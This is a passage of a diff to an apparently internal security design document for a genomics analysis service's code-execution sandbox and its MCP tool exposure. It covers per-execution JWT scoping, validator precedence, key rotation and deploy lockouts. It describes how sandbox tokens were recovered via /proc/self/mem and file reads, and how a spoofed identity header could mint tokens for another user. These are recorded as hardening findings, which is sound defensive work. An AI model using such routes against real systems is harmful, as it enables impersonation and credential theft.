-  condition (**any** verified non-sandbox principal: shared secret, Google id_token, or
-  per-user API token), because auth-gateway's `@api_bearer` location sends real users here
-  with no shared secret. It currently has **no caps specified at all**, and it serves the
-  bulkiest payloads in the suite (summary-statistic ranges, LD matrices) — a per-response
-  byte ceiling matters more here than a row count.
-
-**Blocking dependency.** Points 1 and 2 are **pre-existing bugs, not introduced by this
-design**, and they are tracked as `genetics-results-suite-fad` (already filed). They are
-not fixed here and results-api's authentication is not redesigned in this document — see
-the bead. But the sandbox is the first caller of results-api that runs attacker-authored
-code, so a scoped token is meaningless while an unauthenticated pod on the same network can
-name itself any user: **`4h6.8` and `4h6.9` must not ship before `genetics-results-suite-fad`
-is closed.**
-
-**What the sandbox does *not* get:** `INTERNAL_API_SECRET`, `MCP_API_KEY`, any GCP
-credential, any Keycloak client secret, any Perplexity/Tavily key, and no Kubernetes
-service account token.
-
-### As built (`4h6.9`) — what shipped, and where it departs from the above
-
-Everything in this subsection is code that exists; everything above it that is not repeated
-here is still design. Three files carry the mechanism:
-
-| repo | file | role |
-|---|---|---|
-| genetics-mcp-server | `src/genetics_mcp_server/sandbox_token.py` | mint |
-| genetics-results-db | `api/sandbox_auth.py` | verify (`aud: db-api`) |
-| genetics-results-api | `app/core/sandbox_token.py` | verify (`aud: results-api`) |
-
-**The minting contract `4h6.47` calls.** One call produces the pair for an execution:
-
-```python
-from genetics_mcp_server.sandbox_token import mint_execution_tokens
-
-minted = mint_execution_tokens(user=<authenticated email>, session_id=<chat session id>)
-minted.execution_id   # uuid4 — the jti of both tokens AND the /scratch/<id> directory name
-minted.db_api         # aud: db-api
-minted.results_api    # aud: results-api
-minted.expires_at     # iat + 300
-```
-
-`execution_id` may be passed in when the caller has already chosen the `/scratch` directory
-name; the two must be the same value or the log join in `4h6.12` does not close. Minting
-raises `SandboxTokenUnavailable` when `SANDBOX_TOKEN_SIGNING_KEY` is unset — deliberately an
-exception rather than a `None`, because every fallback from "no sandbox token" is either
-"send no credential" or "send the shared secret", which are the two outcomes this whole
-mechanism exists to prevent. `4h6.47` owns the POST body, and `4h6.43` everything downstream
-of it inside the pod: the mode-0600 file under `/scratch/<id>` and the child's environment. **That
-`0600` is hygiene, not a control**: under the decided shared-uid model (section 2, "The uid
-choice") the supervisor and the child run as the same uid 65532, so the mode excludes nobody
-who could otherwise read the file. The protection is **lifetime** — the SDK reads it once and
-unlinks it — and nothing should be designed as if the mode were doing work.
-
-**Deviations from the design above, all deliberate:**
-
-1. **`iss` is required, not optional.** The design said routing may "optionally also require
-   `iss == "chat-backend"`". Both validators pass `issuer="chat-backend"` to the decoder, so a
-   token signed with the right key but issued by anything else is rejected. Routing still keys
-   on `alg` alone; `iss` is a validation rule, not a routing rule.
-2. **`iat` is checked explicitly.** PyJWT accepts an arbitrarily old `iat` as long as `exp` is
-   in the future, so a token minted with a long TTL would outlive the 5-minute window. Both
-   validators reject `iat` older than 300s, as rule 4 requires.
-3. **`scope` is required to be present** but is not in the decoder's `require` list, because
-   its absence is a distinct rejection reason worth logging separately. Its *value* is still
-   uninterpreted, exactly as the table says.
-4. **The per-credential caps are not implemented here.** Everything from "Implementation note
-   for the caps" to the end of the numbers table — the 50 GB per-query ceiling, the 200 GB
-   per-`jti` aggregate budget, the 25 000-row response cap, and results-api's response-byte
-   ceiling — is **deferred to `genetics-results-suite-4h6.28`**. `4h6.9` ships the credential
-   and the hook it needs: db-api leaves the resolved principal on `request.state.principal`
-   (a `SandboxPrincipal`, the string `"internal"` for a shared-secret caller, or `None` for
-   the fail-open and `/health` cases), and results-api leaves it on
-   `request.state.sandbox_principal`. The "defaults-not-penalty" inversion is a behaviour
-   change for *every* caller of both services and is not a credential change; keeping it out
-   of this bead keeps the fail-closed work reviewable on its own.
-5. **results-api reports a sandbox execution as `sandbox:<user>`, not as the bare email.**
-   `get_verified_user` returns one string and it feeds both authorization and the
-   `endpoint_access` log. Returning the bare email would make a sandbox request
-   indistinguishable from a verified human, which is exactly the distinction `4h6.28`'s relax
-   condition needs. The `sid` and `jti` are added to the `endpoint_access` line from
-   `request.state.sandbox_principal`, and so is `user_email` when no auth dependency ran — from
-   the same `identity`, so the prefix holds on every route rather than only on authenticated
-   ones.
-6. **db-api's `require_auth` no longer early-returns on `/health` *before* clearing state.**
-   It sets `request.state.principal = None` first, so no handler can read a stale principal.
-7. **Minter invariants are asserted by the verifiers, not assumed.** `options={"require": …}`
-   rejects only *missing* or null claims, so both validators additionally reject an empty
-   `sub`, `sid` or `jti` (a token attributing the query to nobody defeats the point of the
-   credential), and require `aud` to be exactly a **string** — PyJWT treats a list `aud` as
-   membership, so `{"aud": ["db-api", "results-api"]}` would otherwise validate at *both*
-   services and one-token-per-audience would be a minter property only.
-8. **`leeway=5` on both `jwt.decode` calls**, for the forward-direction skew the ttl cannot
-   cover — see "Clock skew" above. The `MAX_TOKEN_AGE_SECONDS` check is unaffected.
-9. **Rule 5's logging works differently on the two services.** db-api logs a *dict* message,
-   which its formatter merges into `jsonPayload` verbatim. results-api's `GCPJsonFormatter`
-   copies `extra=` fields when the message is a string, which originally meant *only* the names
-   on an `EXTRA_LOG_FIELDS` allow-list; `sub`, `sid` and `jti` were added to that list here,
-   because without them the "sandbox request authorized" line reached the sink with no
-   attribution at all. **`genetics-results-suite-4h6.65` deleted the list** after it silently
-   ate `log_rejection`'s `code`/`limit`/`observed` (above): the formatter now copies every
-   record attribute that is not one `LogRecord` itself owns, the reserved set being derived
-   from a probe record rather than typed out. Two guards ride with the inversion, because an
-   unconditional copy has failure modes the allow-list did not: extras are merged so they can
-   never displace the line's own output keys or the names Cloud Logging reserves in a
-   structured stdout line (`severity`, `timestamp`, `message`, `logger`, `trace`, `labels`,
-   `httpRequest`, `logging.googleapis.com/*`) — a colliding extra is **re-keyed** to
-   `extra_<name>` rather than dropped, since a silently missing field is the failure this
-   whole change is about, and without it `extra={"severity": "DEBUG"}` on a `logger.warning()`
-   would file the line below an alerting threshold; and `format()` no longer raises, since
-   `default=str` does not cover a circular reference, a non-`str` dict key or a `__str__` that
-   raises — those propagate into `Handler.handleError`, which loses the record and prints an
-   unstructured traceback on stderr that GKE ingests anyway, so a degraded line carrying
-   `log_format_error` is emitted instead. **The direction of the default is the whole
-   point** — an allow-list makes forgetting an entry a no-op, so the log arrives short and
-   nothing fails; a deny-list of names that already mean something makes the omission
-   impossible rather than merely discouraged. The same shape one layer out — genetics-mcp-server
-   `tools/executor.py`'s whitelist of sandbox response fields — is `genetics-results-suite-4h6.97`
-   and is **not** fixed by this; the reasoning above is the answer that bead should apply. The
-   `endpoint_access` line's `sid`/`jti` come from `request.state` on the middleware's dict path
-   and were never affected by either.
-
-**Where the token sits in each validator's precedence.**
-
-- **db-api** — `require_auth`: `/health` → sandbox-shaped bearer (hard 401 on failure) →
-  unset-`INTERNAL_API_SECRET` fail-open → `hmac.compare_digest`. The sandbox branch is
-  ahead of the fail-open early return, which is rule 1.
-- **results-api** — `get_verified_user`, as a new **case 0** ahead of the four cases
-  `genetics-results-suite-fad` established: sandbox token → `sandbox:<user>`; then internal
-  marker + identity header; then internal marker alone → `mcp-tool`; then Google id_token /
-  user API token; then identity header alone → `None`. The same check is also first inside
-  `get_bearer_token_user`, so a direct caller of that function cannot skip it. A sandbox
-  caller holds no shared secret, so it cannot present the trusted-proxy marker and any
-  identity header it sets is already discarded by case 5.
-- **results-api's two resolvers disagree on what a *failed* sandbox token means, deliberately.**
-  `app/core/auth.py`'s `get_sandbox_principal` logs the rejection and raises `401` on
-  `SandboxTokenError`; `app/middleware.py`'s `_sandbox_principal` — the non-raising resolver
-  `SandboxResponseCapMiddleware` uses to admit a request *before* the handler runs — returns
-  `None` for the same exception, so a bearer that fails validation is never admitted, charged or
-  capped by the budget middleware and is left to `auth_required` to reject. Its docstring gives
-  the reason (rejecting there would duplicate that 401 silently, from a layer with no route
-  context); the consequence to hold on to is that such a request appears in **no** per-`jti`
-  counter, and its answer is whatever the auth layer writes rather than a capped response.
-
-**No collision with `genetics-results-suite-fdd`.** That bead is about
-`GOOGLE_TOKEN_AUDIENCE` being the public gcloud CLI client id, so the `aud` check on the
-Google path binds nothing. The sandbox path never reaches `verify_oauth2_token`: an HS256
-bearer is routed away before it, and an RS256 bearer is never routed to the sandbox
-validator. The two audience checks are separate code, separate keys and separate claim
-spaces; `4h6.9` neither fixes nor worsens `fdd`.
-
-**A gap that was an attribution gap as much as an authorization one — now closed, and closed
-where it was said it would have to be: in the public-route set, not in the credential.**
-results-api's `auth_required` returns before any credential check when `REQUIRE_AUTH` is false
-or the route is `@is_public`. With no sandbox principal resolved, `request.state.sandbox_principal`
-is unset and the `endpoint_access` line carries **no `sid` and no `jti`**, so section 6.2's
-control 3 — "what did that script actually read?" — was blind on that route set, and `4h6.28`'s
-per-credential caps, which key on the resolved principal, did not apply there either.
-
-Since `genetics-results-suite-0lf`, `is_public_endpoint` answers true only for
-`ALWAYS_ANONYMOUS_PATHS` (`/healthz`) whenever `ANONYMOUS_SURFACE_MINIMAL` is on — its default,
-and forced by `SANDBOX_ENABLED` (`genetics-results-suite-rhh`) — so with the sandbox deployed
-there is no route a script can reach without presenting its token, and every request it
-makes is both bounded and attributable. Two residues remain, both narrow: `/healthz` itself is
-anonymous and unattributed (a constant document on no data path, excluded from usage logging by
-design), and under `REQUIRE_AUTH=false` — local development only; the shipped `results-api.yaml`
-sets `"true"` — the short circuit still fires. The sandbox principal is nevertheless resolved
-ahead of *both* short circuits in `app/dependencies.py:auth_required`, so a token that is
-presented is still honoured in dev.
-
-### Deploy ordering: there is no ordering hazard, and one configuration lockout
-
-Unlike `fad` (bff before results-api) and `th2` (auth-gateway before chat-backend), **the
-sandbox credential path is entirely new: no caller sends an HS256 bearer today, and none will
-until `4h6.7` and `4h6.47` land the sandbox and the client that calls the minter.** The sending and receiving
-sides can therefore ship in either order, and the table is short:
-
-| state | chat-backend mints | db-api / results-api verify | result |
-|---|---|---|---|
-| neither shipped | no | no | current behaviour, unchanged |
-| **validators only** | no | yes | **safe.** Nothing sends an HS256 bearer, so the new branch never fires. Every existing credential type is unaffected — shared secret, Google id_token, per-user API token, trusted-proxy marker |
-| **minter only** | yes | no | **safe today**, because nothing calls the minter until `4h6.47`. Were a token sent, an old db-api would 401 it at `compare_digest` and an old results-api would 401 it at `verify_oauth2_token` — a failed request, never an authorization |
-| both shipped | yes | yes | the sandbox path works |
-
-The real ordering constraint is **the secret, not the code**: all three Deployments mount
-`sandbox-token-signing-key` from `genetics-secrets`, so `create-secrets.sh` must run before
-the manifests are applied or the pods sit in `CreateContainerConfigError`. `deploy.sh` now
-checks that key (and `internal-api-secret`) is non-empty before applying anything, so an
-older `genetics-secrets` that predates this work fails at deploy time rather than at pod
-start.
-
-The one lockout is **`SANDBOX_ENABLED=true` with either secret missing, or with a
-`SANDBOX_TOKEN_SIGNING_KEY` under 32 bytes** (`4h6.36`), which is `sys.exit(1)` in both
-verifiers by design — a crash-looping db-api and results-api is the
-whole suite down. **Three manifests ship `SANDBOX_ENABLED: "false"`, not two**
-(`genetics-results-suite-4h6.85`): `k8s/deployments/db-api.yaml`, `results-api.yaml` and
-`chat-backend.yaml`. chat-backend is not a verifier — it mints the tokens and gates the
-`run_analysis` tool — so it does not key the startup assertion, but leaving it `"false"` while
-the sandbox is live withholds `run_analysis` from every tool list with no signal anywhere. The
-deploy that creates the sandbox Deployment (`4h6.7`) flips all three, and must do so only after
-`create-secrets.sh` has run; `scripts/test-network-policies.py` fails the deploy if any of the
-three is left `"false"` or undeclared once a sandbox workload is discoverable.
-
-**What the enabled deploy actually does with the sandbox** (`scripts/deploy.sh`, with
-`ENABLE_SANDBOX=true`): the preflight checks the gVisor node, the container-level `args:` and
-the sandbox image's presence in the registry *before the first apply*; the manifest loop
-resolves the db-api and results-api ClusterIPs from the live cluster, substitutes them into
-`hostAliases` and applies `sandbox.yaml`; and `sandbox` is appended **last** to the
-`kubectl rollout restart` / `rollout status` list — last on purpose, because `strategy: Recreate`
-on a single pinned node makes the restart a brief outage of code execution and a restart
-mid-execution kills that script. With the gate off, none of that runs: the file is skipped, never
-deleted.
-**Rollback direction: set `SANDBOX_ENABLED=false` and restart** — that restores service
-immediately without touching secrets or images, and only disables the startup assertion, not
-the token validation. Since `genetics-results-suite-rhh` it also does **not** re-open
-results-api's anonymous surface, which is what it used to do: that is now
-`ANONYMOUS_SURFACE_MINIMAL`, declared `"true"` in `k8s/deployments/results-api.yaml`, defaulting
-to on when unset, and merely *forced* by `SANDBOX_ENABLED`. The incident lever and the security
-lever are separate, and the security one no longer fails open when the other is flipped under
-pressure.
-
-**Rotating the signing key — not atomic, and it is an outage window, not one lost execution.**
-`create-secrets.sh` reuses the value already in the cluster and only generates on first
-install, like `internal-api-secret`. But all three Deployments read the key from the
-environment, which freezes at *pod start*: updating the Secret changes nothing until each pod
-restarts, and a rolling restart of three Deployments is not simultaneous. For the whole
-restart window the minter and a verifier disagree about the key, and **every sandbox execution
-routed to a pod on the other side of the rotation 401s** — not just the tokens in flight at
-the moment of the change. Sequence it deliberately: patch the Secret, restart all three, and
-treat sandbox executions as failing until the last pod is Ready. Nothing else breaks (the
-shared-secret, Google id_token and user-API-token paths are untouched), and the rollback is
-the same operation in reverse.
-
-**If a Deployment's env is missing the key entirely**, either fix works. Re-running
-`create-secrets.sh` is safe for the optional keys — it reuses whatever is already in the cluster
-for every key it is not given in the environment, so the ones you have not exported
-(`openai-api-key`, `tavily-api-key`, `perplexity-api-key`, `cohere-api-key`,
-`external-mcp-servers`, `admin-users`, `slack-webhook-url`) survive untouched — those stay
-**empty** if the cluster has no value either. `mcp-api-key` is **not** in that group
-(`genetics-results-suite-9xz`): like `internal-api-secret`, `sandbox-token-signing-key` and
-`gateway-identity-secret` it is reused when the cluster already holds a value, but an absent or
-empty one is **generated** rather than left blank, because mcp-server refuses to start without
-it. A re-run therefore never rotates it out from under a running pod, and never leaves it empty. It does require
-`ANTHROPIC_API_KEY` to be exported: that key alone is never read back from the cluster, and
-without it the script aborts before writing anything. Without that key to hand, use the targeted
-`kubectl patch secret genetics-secrets --type=merge` on the one missing key instead —
-`deploy.sh`'s secret gate prints both options.
-
-**Accepted residual: a symmetric key means db-api and results-api can mint.** HS256 is one
-secret shared by all three services, so verification and *minting* are the same capability.
-A compromise of db-api or results-api yields a key that forges tokens impersonating
-chat-backend with any `sub`, `sid` and `jti` — attribution in the `endpoint_access` log is
-only as trustworthy as the least-trusted holder of the key. This is accepted for v1: both
-verifiers are first-party services in the same namespace, and a compromise of either already
-gives an attacker direct query access without needing a token at all. The clean fix is
-**asymmetric signing** — Ed25519 (or RS256) with the private half mounted only on
-chat-backend and the public half on the verifiers — which removes the mint capability from the
-verifiers while keeping validation fully offline, the property that ruled out introspection in
-the first place. Deliberately not done here: it is a claims-compatible swap of algorithm and
-key material that can land on its own, and folding it into `4h6.9` would make the fail-closed
-work harder to review.
+| `iss` | `"chat-backend"` | rejects tokens minted by anything else |
+| `aud` | `"db-api"` or `"results-api"` | prevents cross-service replay |
+| `sub` | authenticated user email | attribution to a person |
+| `sid` | chat session id | makes `endpoint_access` lines attributable to a conversation |
+| `jti` | the execution id | the join key across chat-backend, the sandbox and db-api |
+| `iat`, `exp` | 5-minute lifetime | the wall clock is at most 120s; the slack covers a slow BigQuery job started at the last moment |
+| `scope` | `"query:views"` | a hook for later per-view narrowing; **only its presence is checked** |
+
+**Clock skew, and why the TTL only covers half of it.** The TTL absorbs skew in the *past*
+direction. It does nothing forward: PyJWT ≥ 2.10 raises `ImmatureSignatureError` as soon as
+`iat > now`, so a verifier whose clock runs a fraction of a second behind the minter's rejects a
+freshly minted token outright. Both verifiers pass `leeway=5`, which applies to `exp`, `nbf` and
+`iat` alike and does **not** loosen the 300s bound — the max-age check is separate code that
+compares `iat` against `time.time()` directly and stays exact.
+
+**How the tokens reach the script.** In the **body of the POST**, never in the pod spec, a
+ConfigMap or a Secret — chat-backend cannot set environment variables on a running pod, and a
+pod-spec value would turn a per-execution credential into a static pod-lifetime one. The
+supervisor writes them to a mode-0600 file under `/scratch/<id>` and puts only its **path** in
+the child's environment, because `/proc/<pid>/environ` is readable at the shared uid. The SDK
+reads the file once and unlinks it.
+
+**The file is not an exposure bound, and read-once-and-unlink closes nothing by itself.** A
+detached `setsid()` grandchild of an *earlier* execution was measured reading this execution's
+file inside that window, and a raw `/proc/self/mem` scan in the child recovered tokens from
+executions that had already completed. The **memory** route is closed by the fork server. The
+**same-uid resident** route is closed for a resident of an earlier execution (the subreaper
+sweep) and open for one of the same execution. What the file is genuinely load-bearing for is
+different: the child needs its credential and the fork server must not carry it, so a file the
+supervisor writes and the child opens is a route from one to the other that does not pass
+through the process in between.
+
+**Validation must not inherit fail-open.** db-api's `require_auth` begins
+`if not INTERNAL_API_SECRET … : return`, with a startup warning as the only signal. That is
+deliberate for the shared-secret path and unacceptable for the sandbox path, which is the one
+caller whose input is attacker-influenced. The rules:
+
+1. A sandbox-shaped bearer is routed to the sandbox validator **before** the unset-secret early
+   return can short-circuit it.
+2. **Discriminate on the JOSE header, never by counting dots.** "Three dot-separated segments"
+   matches every RS256 Google Identity Token as well; using it would 401 that entire class of
+   caller. Base64url-decode the first segment unverified, read `alg`, and route to the sandbox
+   validator only when it is `HS256`. The header selects a *validator*, never a key or an
+   algorithm to trust.
+3. Every claim in the table is required and validated. A failure is a hard `401` — never a
+   fallthrough to another auth path.
+4. The response caps are **defaults for every request**, relaxed for a verified non-sandbox
+   principal, rather than sandbox-audience penalties. Otherwise presenting a *weaker*
+   credential buys *looser* limits, which is the wrong gradient.
+5. results-api enforces a response-**byte** cap and no row cap. The row counter recognised only
+   JSON while TSV is the default format of every bulk range endpoint, and parsing the buffered
+   body to count was itself a memory amplifier. Its byte cap is likewise a default for all
+   requests, relaxed for the shared secret, a Google id_token or a per-user API token, because
+   auth-gateway sends real users straight there with no shared secret.
+6. **db-api and results-api refuse to start** when `SANDBOX_ENABLED` is true and either secret
+   is unset. The trigger is the sandbox being deployed, not the signing key being present — with
+   the trigger on the key, a deployment carrying *neither* secret never fires the check, boots
+   fail-open, and the sandbox reaches it by sending no `Authorization` header at all.
+7. `SANDBOX_TOKEN_SIGNING_KEY` is in `deploy.sh`'s secret-existence gate, so the pair cannot be
+   deployed apart in the first place.
 
 ---
 
 ## 5. MCP exposure
 
-The user's requirement is explicit and non-negotiable: **people must not be able to execute
-code via MCP calls.** Three layers enforce it. **Each is independently required** — the
-design assumes any one of them can be defeated by a future refactor, a config change or a
-mistake, and requires that the other two still hold.
+**People must not be able to execute code via MCP calls.** Three layers enforce it, and each is
+independently required: the design assumes any one can be defeated by a future refactor, a
+config change or a mistake, and requires that the other two still hold.
 
-### Layer 1 — tool registration (`4h6.16`)
+**Layer 1 — registration.** `run_analysis` and `read_artifact` are in mcp-server's *hardcoded*
+disabled set, not the env-driven half. `run_analysis` additionally has no `@mcp.tool()` block
+at all, which matters because a disabled set can only subtract. A tool is registered on `/mcp`
+from the moment its definition exists unless it is excluded, so each exclusion landed in the
+same change that defined the tool. `list_capabilities` is deliberately *not* excluded: an
+exclusion set padded with names that are not security controls stops reading as a security
+control.
 
-`genetics-mcp-server/src/genetics_mcp_server/mcp_server.py` builds
+**Layer 2 — NetworkPolicy.** The sandbox's ingress rule admits chat-backend only; mcp-server is
+denied at the network layer. Read it as a **hop-level** control, not a capability-level one: the
+namespace admits mcp-server to chat-backend, mcp-server holds both `INTERNAL_API_SECRET` and
+`CHAT_BACKEND_URL`, and chat-backend is the one pod the sandbox admits — so
+`mcp-server → chat-backend → sandbox` is open at the network level by construction. That
+transitive path is held shut by layer 1 and by the identity check, not by this policy.
 
-```python
-_mcp_disabled = _settings.disabled_tools | {
-    "search_scientific_literature",
-    "web_search",
-    ...
-}
-register_mcp_tools(mcp, executor, disabled_tools=_mcp_disabled)
-```
+**Layer 3 — tests.** `tests/test_mcp_server.py` asserts the two names are absent from the
+**actual `/mcp` tool list**, enumerated from the live `FastMCP` instance rather than from the
+constant: asserting on the constant tests that someone typed the name, asserting on the tool
+list tests that the registration path honoured it. Two further assertions: registering with an
+**empty** disabled set still does not produce `run_analysis` (the property configuration cannot
+undo), and the name is present in the constant (the property an operator greps for). The
+route-level assertion ships as an **import-graph** assertion — importing `mcp_server` in a
+subprocess must leave `sandbox_client` out of `sys.modules` — which is the stronger form while
+`chat_api` is a separate app that is never mounted, and must be rewritten as route enumeration
+if that ever changes. `register_proxy_tools` is an accepted residual: a tool an external MCP
+server contributes under the name `run_analysis` routes to that server and cannot reach our
+sandbox client.
 
-Add `run_analysis` and `read_artifact` to that literal set — the hardcoded half, not
-`_settings.disabled_tools`, which is env-driven and therefore changeable without a code
-review. Follow the existing pattern including the explanatory comment: the current comment
-distinguishes technical limits ("uses Perplexity API") from product decisions; this one is
-a security control and should say so.
-
-**Both halves have landed.** `4h6.15` added `read_artifact` to the literal set in the same
-change that defined the tool. That was not eagerness about a `4h6.16` deliverable: a tool is
-registered on `/mcp` from the moment its definition exists unless it is excluded, so
-deferring the exclusion would have shipped a window in which the tool was live over MCP.
-`run_analysis` joined it with **`4h6.48`**, the task that defined the tool — earlier
-versions of this sentence and of the handoff row said `4h6.16`, which is wrong. The `code`
-`TOOL_PROFILE` and the route-level assertion below remain `4h6.16`'s.
-
-**`list_capabilities` is deliberately *not* excluded, and the reason is not that it
-discloses nothing.** Keeping it out of the set is still the right call — an exclusion set
-padded with names that are not security controls stops reading as a security control, and
-the next reader can no longer tell which entries are load-bearing. But an earlier version of
-this passage justified it with "it discloses no data, no session state and no execution" and
-with the claim that an MCP client can already see what it renders. The second argument is
-simply false: the SDK is not the MCP tool surface, and the catalogue is new disclosure to an
-MCP client. It is accepted **on its content**, which was measured by diffing the tool's real
-output against everything an MCP client can otherwise reach:
-
-- **Removed.** The output used to carry each module's `__doc__`, and through it
-  `INTERNAL_API_SECRET`, `GENETICS_API_URL`, `BIGQUERY_API_URL`, the name `results-api`, and
-  an internal bead id. Module docstrings are now stripped from the rendered output — the
-  index carries hand-written one-line summaries instead — so those are gone.
-- **Still disclosed, and accepted rather than denied — stated as categories, deliberately.**
-  Function docstrings are the thing the catalogue exists to render, and what they leak falls
-  into four kinds: the **settings mechanism** (e.g. `_URL_SETTINGS`), **internal service and
-  component names** (e.g. `db-api`), the **execution model** — that a code-execution sandbox
-  exists at all — and **limit and quota values** (e.g. the per-execution row and byte caps).
-  The examples are illustrative, not a list. An exhaustive enumeration has been attempted
-  twice in this passage and was incomplete both times, so the categories are the claim and a
-  reader who needs the current residue should diff the tool's real output rather than trust a
-  list here. No credential **values** are exposed, and view names are separately obtainable
-  through `get_database_schema`, which is registered.
-- **Closing the residue is a separate decision, not a follow-up here.** The only way to
-  remove it is to edit the SDK's own docstrings, which changes what a sandboxed script reads
-  when it introspects the SDK and drifts the generated `sandbox/stubs/*.pyi` against their
-  source. That trade — MCP-side disclosure against in-sandbox documentation quality — is not
-  `4h6.16`'s to make silently.
-
-**A warning, not a reinforcement: `TOOL_PROFILE` provides no protection here, and the
-intuition about it is backwards.** An earlier draft offered "the `code` `TOOL_PROFILE` is a
-chat-backend profile only and is never selected by the standalone MCP server" as a second
-control. The opposite is true. In
-`genetics-mcp-server/src/genetics_mcp_server/tools/definitions.py`, `get_anthropic_tools`
-treats `tool_profile=None` as **no filtering — every tool**, and `mcp_server.py` calls
-`register_mcp_tools(mcp, executor, disabled_tools=_mcp_disabled)` with no profile argument
-at all. So "the MCP server does not select the `code` profile" is *precisely the condition
-under which `run_analysis` would be registered* — were `_mcp_disabled` the only thing
-standing in the way.
-
-**There are two registration-layer controls, not one, and this section used to claim
-otherwise.** The correction runs in the safe direction, which is why it is worth making:
-the argument below assumes layer 1 is defeatable and asks layers 2 and 3 to hold without
-it, and that assumption is *weaker than the position actually held*.
-
-1. **Membership of `_mcp_disabled`** — the named, greppable control, assembled at runtime
-   from an env-driven half and a hardcoded half, and therefore the changeable one.
-2. **`run_analysis` has no `@mcp.tool()` block at all.** `register_mcp_tools` in
-   `tools/definitions.py` is a hand-written sequence of `@mcp.tool()` blocks wrapping
-   decorated closures, the large majority of them **unconditional** — only a small minority
-   sit behind an `if "<name>" not in _disabled:` guard at all — and it never iterates
-   `TOOL_DEFINITIONS`. A tool is on `/mcp` because someone wrote its block, not because a
-   definition exists. `read_artifact`
-   has a block and is excluded by name; `run_analysis` has none, and `disabled_tools` can
-   only **subtract**. So no value of `MCP_DISABLED_TOOLS`, no profile, no category and no
-   empty disabled set registers it — the tool cannot be turned on by configuration, only by
-   someone writing a new block. The omission also matches what the tool needs: its handler
-   is handed the authenticated user and the chat session id by its caller, and an MCP
-   session has neither, so a registered wrapper could only ever pass identity it does not
-   hold.
-
-Keep the `_mcp_disabled` entry regardless. It costs nothing, it is what an operator greps
-for, and it is what catches a `@mcp.tool()` block added later by someone who did not read
-the comment sitting where the block would go.
-
-**An adversarial review could not find a configuration that puts `run_analysis` on `/mcp`** —
-not by env var, not by an empty disabled set, not by category, profile or any dynamic
-registration path. That is the strongest single piece of evidence the boundary holds, and it
-is a property of control 2 rather than of control 1. The only route back on is a hand-added
-`@mcp.tool()` block, which control 1 and the layer-3 tests would both catch.
-
-**One residual, stated rather than fixed: `mcp_proxy.register_proxy_tools` registers
-*external* MCP servers' tools consulting only `EXTERNAL_MCP_EXCLUDE_TOOLS`, never
-`_mcp_disabled`.** An external server can therefore put a tool literally named
-`run_analysis` on `/mcp`. It is **not** a code-execution bypass — the call proxies to that
-external server and cannot reach our sandbox — but it defeats enumeration by name, so a
-reviewer who greps the live tool list for `run_analysis` can get a hit that means something
-else entirely. Pre-existing and deliberately left alone; the fix, if wanted, is to union
-`_mcp_disabled` into `exclude_tools`, and that is a separate decision.
-
-Two further hazards for `4h6.16`:
-
-- There is **no `code` profile today**. It is created by this work; nothing about it can be
-  cited as an existing control.
-- **An unknown profile name still degrades to the default set rather than raising.** A typo
-  at any call site — `"code "`, `"codes"`, a renamed constant — produces a running server
-  with a quietly different tool set. What changed with `genetics-results-suite-4h6.74` is
-  that the degrade is no longer *silent*, and the distinction matters here: the lookup is
-  now `TOOL_PROFILES.get(profile)` followed by an explicit `None` branch that calls
-  `_warn_unknown_profile` (`definitions.py`), which logs one WARNING per **distinct**
-  unknown value — capped at 64 distinct values, because the value is re-sent on every turn
-  of a session that stored it — and `GET /chat/v1/tools/resolved` answers
-  `known_profile: false` for the same input. Both are **observability, not enforcement**:
-  neither refuses the request, and the resolved tool set is byte-identical either way. If
-  profile selection is ever load-bearing for a security property, that `None` branch must
-  become a raise first. Per-profile behaviour is in `docs/chat-tool-reference.md` § 3.
-
-### Layer 2 — NetworkPolicy (`4h6.8`)
-
-The sandbox's ingress rule admits `app: chat-backend` only. mcp-server is denied at the
-network layer.
-
-**Shipped in `4h6.8`** as `allow-ingress-sandbox` in `k8s/network-policies/sandbox-policy.yaml`,
-with an **offline** guard in `scripts/test-network-policies.py`. Because NetworkPolicies are
-additive, "mcp-server cannot reach the sandbox" is a property of every file in
-`k8s/network-policies/` at once, so the guard parses them all and asserts that no rule
-selecting `app: sandbox` admits `app: mcp-server` — including via a from-less rule, which
-admits everything. That guard runs with no cluster and no network — the harness's single cluster
-call is elsewhere, in the `SANDBOX_ENABLED` check's live-sandbox probe — which is the only kind of test
-available before `4h6.7` and `4h6.10` deploy anything. **The live connection test from the
-mcp-server pod to the sandbox Service is deferred to the deploy window** and tracked as
-`genetics-results-suite-4h6.26` with the other post-deploy verifications; it has not been run.
-
-**What layer 2 does and does not guarantee.** It guarantees that *mcp-server cannot open a
-socket to the sandbox*. It does **not** guarantee that an MCP client cannot cause code to
-execute: `policies.yaml` admits `app: mcp-server` to chat-backend on 8000, mcp-server holds
-both `INTERNAL_API_SECRET` and `CHAT_BACKEND_URL`, and chat-backend is the one pod the
-sandbox admits — so the network layer closes `mcp-server -> sandbox` but leaves
-`mcp-server -> chat-backend -> sandbox` open at the network level by construction. That
-transitive path is held shut by layer 1 (the tools are never registered on mcp-server, so
-no MCP call names them) plus the identity check described next, not by this policy.
-Read layer 2 as a hop-level control, not a capability-level one.
-
-**Layer 2b — the dispatch requires a real user (`4h6.27`).** "chat-backend's route-level
-authorization" was the original answer here and it was not one: a valid
-`INTERNAL_API_SECRET` bearer with no identity header is *authenticated*, resolving to
-exactly the `mcp-tool` service identity (`genetics-results-suite-th2`), and mcp-server
-holds that secret. `ToolExecutor.run_analysis` now refuses that identity outright
-(`auth.core.SERVICE_IDENTITY`), returning the `SandboxNotConfigured` / `retryable: false`
-shape and logging at `ERROR`, so an authenticated *caller* is no longer sufficient — an
-authenticated *person* is. Enforced at the tool dispatch rather than on the HTTP route: it
-is the single point every execution passes (streaming chat, non-streaming chat, subagent
-dispatch, anything added later) and it sits immediately before `mint_execution_tokens`, so
-no per-execution credential can be minted for a subject that was refused. A route-level
-check would cover only the routes someone remembered to decorate, and would also refuse
-plain chat, which the marker identity may legitimately use.
-
-**Layer 2c — the dispatch requires a secret only auth-gateway holds (`4h6.84`).** `4h6.27`
-above refuses the marker-*alone* service identity. That is case 3 of
-`auth/dependencies.py`, and case 1 beats it: an identity header, once present, decides the
-outcome, so any holder of `INTERNAL_API_SECRET` — mcp-server included, and the NetworkPolicy
-admits it to chat-backend:8000 — could send `X-Goog-Authenticated-User-Email:
-someone@finngen.fi` alongside the marker, resolve to that address rather than to
-`mcp-tool`, pass the `4h6.27` guard, and have both per-execution JWTs minted with `sub` set
-to the address it typed. `session_id` is client-supplied and unvalidated, so the artifact
-scope *and* the audit trail would name a person who never made the request.
-
-**The first attempt at this gated on the marker's TRANSPORT, and it was measurably
-bypassable — recorded here because the shape of the mistake is easy to repeat.** It
